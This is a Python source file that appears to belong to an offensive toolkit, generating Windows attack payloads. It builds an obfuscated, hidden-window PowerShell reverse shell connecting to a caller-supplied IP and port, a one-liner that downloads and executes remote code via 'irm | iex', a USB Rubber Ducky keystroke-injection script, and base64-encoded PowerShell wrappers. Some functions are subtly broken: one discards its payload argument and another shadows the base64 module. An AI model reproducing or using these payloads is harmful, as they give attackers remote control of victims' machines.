from core.TextAssets    import *

import base64
import os
import subprocess

class Payload:
        def tcp(
                callback_ip: str, 
                callback_port: str
        ) -> str:
                payload  = ""
                payload += "start powershell -wi h -a {"
                payload += "class VARIADIC_1 { "
                payload +=         "$VARIADIC_2; "
                payload +=         "$VARIADIC_3; "
                payload +=         "$VARIADIC_4; "
                payload +=         "VARIADIC_1() { "
                payload +=                 "$VARIADIC_9 = @{ "
                payload +=                         "VARIADIC_A = 0; "
                payload +=                         "VARIADIC_B = 0; "
                payload +=                         "VARIADIC_C = 0 "
                payload +=                 "}; "
                payload +=                 "$this.VARIADIC_4 = @{ "
                payload +=                         "VARIADIC_5 = $VARIADIC_9.CLONE(); "
                payload +=                         "VARIADIC_6 = $VARIADIC_9.CLONE(); "
                payload +=                         "VARIADIC_7 = $VARIADIC_9.CLONE(); "
                payload +=                         "VARIADIC_8 = $VARIADIC_9.CLONE() "
                payload +=                 "} "
                payload +=         "} "
                payload +=         "[BOOL] VARIADIC_N($VARIADIC_D) { "
                payload +=                 "$VARIADIC_D.CLIENT.BLOCKING = 1; "
                payload +=                 "$this.VARIADIC_2 = $VARIADIC_D; "
                payload +=                 "$this.VARIADIC_4.VARIADIC_5.VARIADIC_A = $this.VARIADIC_2.GETSTREAM(); "
                payload +=                 "return $this.VARIADIC_2 -and $this.VARIADIC_4.VARIADIC_5.VARIADIC_A "
                payload +=         "} "
                payload +=         "[BOOL] VARIADIC_O($VARIADIC_E) { "
                payload +=                 "$VARIADIC_F = [DIAGNOSTICS.PROCESSSTARTINFO]::new(); "
                payload +=                 "$VARIADIC_F.FILENAME = $VARIADIC_E; "
                payload +=                 "$VARIADIC_F.USESHELLEXECUTE = 0; "
                payload +=                 "$VARIADIC_F.REDIRECTSTANDARDINPUT = 1; "
                payload +=                 "$VARIADIC_F.REDIRECTSTANDARDOUTPUT = 1; "
                payload +=                 "$VARIADIC_F.REDIRECTSTANDARDERROR = 1; "
                payload +=                 "if (-not ($this.VARIADIC_3 = [DIAGNOSTICS.PROCESS]::START($VARIADIC_F))) { "
                payload +=                         "return $false "
                payload +=                 "}; "
                payload +=                 "$this.VARIADIC_4.VARIADIC_6.VARIADIC_A = $this.VARIADIC_3.STANDARDINPUT.BASESTREAM; "
                payload +=                 "$this.VARIADIC_4.VARIADIC_7.VARIADIC_A = $this.VARIADIC_3.STANDARDOUTPUT.BASESTREAM; "
                payload +=                 "$this.VARIADIC_4.VARIADIC_8.VARIADIC_A = $this.VARIADIC_3.STANDARDERROR.BASESTREAM; "
                payload +=                 "return $true "
                payload +=         "} "
                payload +=         "[VOID] VARIADIC_P($VARIADIC_G) { "
                payload +=                 "$VARIADIC_G.VARIADIC_B = [BYTE[]]::new(1024); "
                payload +=                 "$VARIADIC_G.VARIADIC_C = $VARIADIC_G.VARIADIC_A.BEGINREAD($VARIADIC_G.VARIADIC_B, 0, $VARIADIC_G.VARIADIC_B.LENGTH, $null, $null) "
                payload +=         "} "
                payload +=         "[VOID] VARIADIC_Q() { "
                payload +=                 "if ($this.VARIADIC_2) { "
                payload +=                         "$this.VARIADIC_P($this.VARIADIC_4.VARIADIC_5) "
                payload +=                 "}; "
                payload +=                 "if ($this.VARIADIC_3) { "
                payload +=                         "$this.VARIADIC_P($this.VARIADIC_4.VARIADIC_7); "
                payload +=                         "$this.VARIADIC_P($this.VARIADIC_4.VARIADIC_8) "
                payload +=                 "} "
                payload +=         "} "
                payload +=         "[BYTE[]] VARIADIC_R($VARIADIC_H) { "
                payload +=                 "if (-not $VARIADIC_H.VARIADIC_C.ISCOMPLETED) { "
                payload +=                         "return @() "
                payload +=                 "}; "
                payload +=                 "$VARIADIC_I = $VARIADIC_H.VARIADIC_A.ENDREAD($VARIADIC_H.VARIADIC_C); "
                payload +=                 "$VARIADIC_J = $VARIADIC_H.VARIADIC_B.CLONE()[0..($VARIADIC_I - 1)]; "
                payload +=                 "$this.VARIADIC_P($VARIADIC_H); "
                payload +=                 "return $VARIADIC_J "
                payload +=         "} "
                payload +=         "[VOID] VARIADIC_S() { "
                payload +=                 "if ($VARIADIC_K = $this.VARIADIC_R($this.VARIADIC_4.VARIADIC_5)) { "
                payload +=                         "$this.VARIADIC_4.VARIADIC_6.VARIADIC_A.WRITE($VARIADIC_K, 0, $VARIADIC_K.LENGTH); "
                payload +=                         "$this.VARIADIC_4.VARIADIC_6.VARIADIC_A.FLUSH() "
                payload +=                 "}; "
                payload +=                 "if ($VARIADIC_L = $this.VARIADIC_R($this.VARIADIC_4.VARIADIC_7)) { "
                payload +=                         "$this.VARIADIC_4.VARIADIC_5.VARIADIC_A.WRITE($VARIADIC_L, 0, $VARIADIC_L.LENGTH); "
                payload +=                         "$this.VARIADIC_4.VARIADIC_5.VARIADIC_A.FLUSH() "
                payload +=                 "}; "
                payload +=                 "if ($VARIADIC_M = $this.VARIADIC_R($this.VARIADIC_4.VARIADIC_8)) { "
                payload +=                         "$this.VARIADIC_4.VARIADIC_5.VARIADIC_A.WRITE($VARIADIC_M, 0, $VARIADIC_M.LENGTH); "
                payload +=                         "$this.VARIADIC_4.VARIADIC_5.VARIADIC_A.FLUSH() "
                payload +=                 "} "
                payload +=         "} "
                payload += "} "
                payload += "$VARIADIC_Z = [NET.SOCKETS.TCPCLIENT]::NEW('" + callback_ip + "', " + callback_port + "); " 
                payload += "$VARIADIC_T = [VARIADIC_1]::NEW(); "
                payload += "$VARIADIC_T.VARIADIC_N($VARIADIC_Z); "
                payload += "$VARIADIC_T.VARIADIC_O('POWERSHELL.EXE'); "
                payload += "$VARIADIC_T.VARIADIC_Q(); "
                payload += "WHILE (-NOT $VARIADIC_T.VARIADIC_3.HASEXITED -AND $VARIADIC_T.VARIADIC_2.CONNECTED) { "
                payload +=         "$VARIADIC_T.VARIADIC_S() "
                payload += "}"
                payload += "EXIT"
                payload += "}"

                return payload

        def http(
                callback_ip: str, 
                callback_port: str
        ) -> str:
                payload  = ""
                payload += "powershell irm http://" + callback_ip + ":" + callback_port + "|iex"
                
                return payload

        def ducky(payload: str) -> None:
                payload  = ""
                payload += "GUI r \n"
                payload += "DELAY 500 \n"
                payload += "STRING " + payload + "\n"
                payload += "ENTER \n"

                with open("ducky.tmp", "w") as file:
                        file.write(payload)
                        file.close()

                command                 = ["java", "-jar", "bin/encoder.jar", "-i", "ducky.tmp", "-o", "inject.bin"]
                subprocess.run(
                        command,
                        stdout          = subprocess.DEVNULL,
                        stderr          = subprocess.DEVNULL
                )

                info("Ducky script encoded at 'inject.bin'") if os.path.exists("inject.bin") else info("Ducky script failed to encode.")
                os.remove("ducky.tmp")

        def base64(payload: str) -> str:
                b64  = ""
                b64 += "powershell -enc "
                b64 += base64.b64encode(payload.encode("UTF-16-LE")).decode("ASCII")

                return b64

        def raw(payload: str) -> str:
                return payload